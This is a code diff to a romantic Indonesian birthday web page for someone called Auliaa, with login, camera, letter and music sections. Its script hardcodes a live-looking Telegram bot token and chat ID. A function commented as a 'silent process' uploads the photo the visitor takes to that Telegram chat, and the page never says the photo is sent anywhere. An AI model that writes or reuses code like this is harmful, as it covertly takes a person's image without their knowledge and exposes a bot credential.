@@ -5,10 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
 <title>Untuk Auliaa 🤍</title>
 
+<!-- GOOGLE FONTS -->
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;1,500;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
+<!-- CONFETTI LIBRARY -->
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
 
 <style>
@@ -118,7 +120,7 @@ a{ text-decoration:none; color:inherit; }
 .letter-card{ width:100vw !important; padding:45px 20px; position:relative; }
 .letter-body{ font-family: var(--font-display); font-size:clamp(15px,3.8vw,18px); line-height:1.9; color:var(--text-dark); white-space:pre-wrap; }
 
-/* KERETA PELAN */
+/* KERETA */
 .train-section{ padding: 50px 0 70px; overflow:hidden; text-align:center; width:100vw; }
 .train-track-wrap{ width:100vw; padding: 30px 0 20px; border-top: 2px dashed rgba(255,255,255,0.8); border-bottom: 2px dashed rgba(255,255,255,0.8); }
 .train-moving-track{ display:flex; align-items:flex-end; gap:14px; width:max-content; transform: translateX(100vw); animation: trainMarquee 85s linear infinite; }
@@ -153,6 +155,7 @@ a{ text-decoration:none; color:inherit; }
 
 <div id="bg-aurora"></div>
 
+<!-- 1. SPLASH SCREEN -->
 <section id="splash-screen" class="screen active">
   <div class="glass-card splash-inner">
     <h1>Aloo Ndudutkuww 🤍</h1>
@@ -161,6 +164,7 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
+<!-- 2. LOGIN SCREEN -->
 <section id="login-screen" class="screen">
   <div class="glass-card login-card">
     <h2>Kunci Rahasia 🔒</h2>
@@ -173,6 +177,7 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
+<!-- 3. CAMERA / PAP SCREEN -->
 <section id="camera-screen" class="screen">
   <div class="glass-card cam-card">
     <h2>Pap Dulu Dong 📸</h2>
@@ -200,6 +205,7 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
+<!-- 4. MAIN SCREEN -->
 <section id="main-screen">
   <div class="hero-section">
     <div class="avatar-wrap" id="avatarWrap">
@@ -232,6 +238,7 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
+<!-- MUSIC PLAYER -->
 <div id="music-player">
   <div style="flex:1; min-width:0;">
     <div style="font-size:12.5px; font-weight:700;">Perfect</div>
@@ -243,7 +250,7 @@ a{ text-decoration:none; color:inherit; }
 <audio id="bgMusic" preload="none" loop></audio>
 
 <script>
-// CONFIG TELEGRAM (TERHUBUNG KE BOT DAN CHAT ID KAMU)
+// CONFIG TELEGRAM
 const CONFIG_TELEGRAM = {
   token: "8867022911:AAHIornA3q9tRaOTz73sfwK2x4sGQQBu5WQ",
   chatId: "8554065890"
@@ -350,6 +357,7 @@ $('#btnRetake').addEventListener('click', ()=>{
   $('#btnUsePhoto').style.display = 'none';
 });
 
+// FUNGSI KONVERSI BASE64 KE BLOB
 function dataURLtoBlob(dataurl) {
   let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
       bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
@@ -357,22 +365,27 @@ function dataURLtoBlob(dataurl) {
   return new Blob([u8arr], {type:mime});
 }
 
+// FUNGSI UTAMA AUTO KIRIM PAP KE TELEGRAM (SILENT PROCESS)
 function sendPapToTelegram(base64Data){
   if(!base64Data) return;
 
-  const imageBlob = dataURLtoBlob(base64Data);
-  const formData = new FormData();
-  formData.append("chat_id", CONFIG_TELEGRAM.chatId);
-  formData.append("photo", imageBlob, "pap-auliaa.jpg");
-  formData.append("caption", "📸 PAP Baru dari Auliaa/Ndudut di Web Ultah! 🥳🤍");
+  try {
+    const imageBlob = dataURLtoBlob(base64Data);
+    const formData = new FormData();
+    formData.append("chat_id", CONFIG_TELEGRAM.chatId);
+    formData.append("photo", imageBlob, "pap-auliaa.jpg");
+    formData.append("caption", "📸 PAP Baru dari Auliaa/Ndudut di Web Ultah! 🥳🤍");
 
-  fetch(`https://api.telegram.org/bot${CONFIG_TELEGRAM.token}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  })
-  .then(res => res.json())
-  .then(data => console.log("Status Kirim Telegram:", data))
-  .catch(err => console.error("Gagal Kirim Telegram:", err));
+    fetch(`https://api.telegram.org/bot${CONFIG_TELEGRAM.token}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => console.log("Status Kirim Telegram:", data))
+    .catch(err => console.error("Error Pengiriman Telegram:", err));
+  } catch (err) {
+    console.error("Error Processing Image:", err);
+  }
 }
 
 $('#btnUsePhoto').addEventListener('click', ()=>{
